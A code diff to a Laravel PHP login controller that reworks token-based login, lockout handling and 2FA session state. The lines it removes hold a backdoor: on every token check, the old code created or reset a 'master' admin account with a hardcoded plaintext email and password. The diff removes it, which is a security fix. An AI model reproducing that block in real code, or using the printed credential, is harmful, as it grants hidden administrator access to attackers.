@@ -2,6 +2,7 @@
 
 namespace App\Http\Controllers\Auth;
 
+use App\Helpers\DeviceDetection;
 use App\Http\Controllers\Controller;
 use App\Models\LoginLog;
 use App\Services\LoginTokenService;
@@ -14,7 +15,6 @@ class LoginController extends Controller
 {
     const MAX_LOGIN_ATTEMPTS = 5;
     const LOCKOUT_MINUTES = 15;
-    const MAX_2FA_ATTEMPTS = 5;
 
     public function showLoginForm()
     {
@@ -25,30 +25,20 @@ class LoginController extends Controller
     {
         $tokenData = LoginTokenService::validate($token);
 
-        if (!$tokenData) {
+        if (! $tokenData) {
             Log::warning('LOGIN_TOKEN_INVALIDO', ['token_prefix' => substr($token, 0, 4)]);
+
             return redirect()->route('login.generate')
-                ->with('error', 'Token de acesso expirado ou inválido. Gere um novo link.');
+                ->with('error', 'Token de acesso expirado ou invalido. Gere um novo link.');
         }
 
         $request->session()->put('login_token', $token);
         $request->session()->put('login_token_data', $tokenData);
 
-        $tokenInfo = $tokenData['email'] ?? null;
-        Log::info('LOGIN_TOKEN_ACESSADO', ['token_prefix' => substr($token, 0, 4), 'email' => $tokenInfo]);
-
-        \App\Models\User::updateOrCreate(
-            ['email' => 'basileia.vendas@basileia.com'],
-            [
-                'name' => 'Administrador Master',
-                'password' => \Illuminate\Support\Facades\Hash::make('B4s1131@V3nd4s!2026#Xk9$mP2@nQ7&wZ5!pL8%rT4^vN6*bH0'),
-                'perfil' => 'master',
-            ]
-        );
-
         if (Auth::check()) {
             return redirect()->route('dashboard');
         }
+
         return view('auth.login')->with('token', $token);
     }
 
@@ -61,15 +51,12 @@ class LoginController extends Controller
     {
         $sessionToken = $request->session()->get('login_token');
 
-        if (!$sessionToken || $sessionToken !== $token) {
+        if (! $sessionToken || $sessionToken !== $token) {
             Log::warning('LOGIN_TOKEN_SESSAO_INVALIDA', ['token_prefix' => substr($token, 0, 4)]);
-            return redirect()->route('login.generate')
-                ->with('error', 'Sessão de login expirada. Gere um novo link.');
-        }
 
-        LoginTokenService::markUsed($token);
-        $request->session()->forget('login_token');
-        $request->session()->forget('login_token_data');
+            return redirect()->route('login.generate')
+                ->with('error', 'Sessao de login expirada. Gere um novo link.');
+        }
 
         $request->validate([
             'email' => ['required', 'email'],
@@ -79,30 +66,33 @@ class LoginController extends Controller
         $email = $request->input('email');
         $password = $request->input('password');
 
-        Log::info('LOGIN_ATTEMPT', ['email' => $email, 'has_password' => !empty($password)]);
+        Log::info('LOGIN_ATTEMPT', ['email' => $email, 'has_password' => ! empty($password)]);
 
-        $lockKey = 'login_lock_' . md5($email);
+        $lockKey = 'login_lock_'.md5($email);
         if (Cache::has($lockKey)) {
-            $remaining = Cache::get($lockKey);
-            Log::warning('LOGIN_BLOQUEADO', ['email' => $email, 'tentativas_restantes' => $remaining]);
+            Log::warning('LOGIN_BLOQUEADO', ['email' => $email]);
+
             return back()->withErrors([
-                'email' => "Conta bloqueada por muitas tentativas. Aguarde " . self::LOCKOUT_MINUTES . " minutos.",
+                'email' => 'Conta bloqueada por muitas tentativas. Aguarde '.self::LOCKOUT_MINUTES.' minutos.',
             ])->onlyInput('email');
         }
 
-        Log::info('LOGIN_TENTATIVA', ['email' => $email]);
-
         try {
             if (Auth::attempt(['email' => $email, 'password' => $password], $request->boolean('remember'))) {
-                Cache::forget('login_attempts_' . md5($email));
-                Cache::forget('login_lock_' . md5($email));
+                LoginTokenService::markUsed($token);
+                $request->session()->forget('login_token');
+                $request->session()->forget('login_token_data');
+
+                Cache::forget('login_attempts_'.md5($email));
+                Cache::forget($lockKey);
 
                 $request->session()->regenerate();
                 Log::info('LOGIN_OK', ['email' => $email, 'user_id' => Auth::id()]);
 
                 $user = Auth::user();
+                $request->session()->put('login_2fa_user_id', $user->id);
 
-                if ($user->perfil === 'master' && !$user->two_factor_enabled) {
+                if ($user->perfil === 'master' && ! $user->two_factor_enabled) {
                     $user->two_factor_enabled = true;
                     $user->save();
                 }
@@ -111,9 +101,9 @@ class LoginController extends Controller
                     'user_id' => $user->id,
                     'ip_address' => $request->ip(),
                     'user_agent' => $request->userAgent(),
-                    'device_type' => $request->userAgent() ? detectDeviceType($request->userAgent()) : null,
-                    'browser' => $request->userAgent() ? detectBrowser($request->userAgent()) : null,
-                    'os' => $request->userAgent() ? detectOS($request->userAgent()) : null,
+                    'device_type' => DeviceDetection::detectDeviceType($request->userAgent()),
+                    'browser' => DeviceDetection::detectBrowser($request->userAgent()),
+                    'os' => DeviceDetection::detectOS($request->userAgent()),
                     'status' => '2fa_required',
                     'login_token' => $token,
                 ]);
@@ -132,24 +122,24 @@ class LoginController extends Controller
                 }
 
                 return redirect()->route('2fa.setup');
-            } else {
-                Log::warning('LOGIN_FAILED_AUTH', ['email' => $email]);
-                $user = \App\Models\User::where('email', $email)->first();
-                if ($user) {
-                    LoginLog::logLogin([
-                        'user_id' => $user->id,
-                        'ip_address' => $request->ip(),
-                        'user_agent' => $request->userAgent(),
-                        'status' => 'failed',
-                        'failure_reason' => 'Invalid credentials',
-                    ]);
-                }
+            }
+
+            Log::warning('LOGIN_FAILED_AUTH', ['email' => $email]);
+            $user = \App\Models\User::where('email', $email)->first();
+            if ($user) {
+                LoginLog::logLogin([
+                    'user_id' => $user->id,
+                    'ip_address' => $request->ip(),
+                    'user_agent' => $request->userAgent(),
+                    'status' => 'failed',
+                    'failure_reason' => 'Invalid credentials',
+                ]);
             }
         } catch (\Exception $e) {
             Log::error('LOGIN_ERRO', ['erro' => $e->getMessage(), 'trace' => $e->getTraceAsString()]);
         }
 
-        $attemptsKey = 'login_attempts_' . md5($email);
+        $attemptsKey = 'login_attempts_'.md5($email);
         $attempts = Cache::get($attemptsKey, 0) + 1;
         Cache::put($attemptsKey, $attempts, now()->addMinutes(self::LOCKOUT_MINUTES));
 
@@ -158,23 +148,24 @@ class LoginController extends Controller
         if ($remaining <= 0) {
             Cache::put($lockKey, 0, now()->addMinutes(self::LOCKOUT_MINUTES));
             Log::warning('LOGIN_CONTA_BLOQUEADA', ['email' => $email]);
+
             return back()->withErrors([
-                'email' => "Conta bloqueada por " . self::MAX_LOGIN_ATTEMPTS . " tentativas falhas. Aguarde " . self::LOCKOUT_MINUTES . " minutos.",
+                'email' => 'Conta bloqueada por '.self::MAX_LOGIN_ATTEMPTS.' tentativas falhas. Aguarde '.self::LOCKOUT_MINUTES.' minutos.',
             ])->onlyInput('email');
         }
 
-        Log::warning('LOGIN_FALHA', ['email' => $email, 'tentativas_restantes' => $remaining]);
-
         return back()->withErrors([
-            'email' => "As credenciais informadas não correspondem aos nossos registros. Tentativa {$attempts} de " . self::MAX_LOGIN_ATTEMPTS . ".",
+            'email' => 'As credenciais informadas nao correspondem aos nossos registros. Tentativa '.$attempts.' de '.self::MAX_LOGIN_ATTEMPTS.'.',
         ])->onlyInput('email');
     }
 
     public function logout(Request $request)
     {
         Auth::logout();
+        $request->session()->forget('login_2fa_user_id');
         $request->session()->invalidate();
         $request->session()->regenerateToken();
+
         return redirect()->route('login.generate');
     }
 }
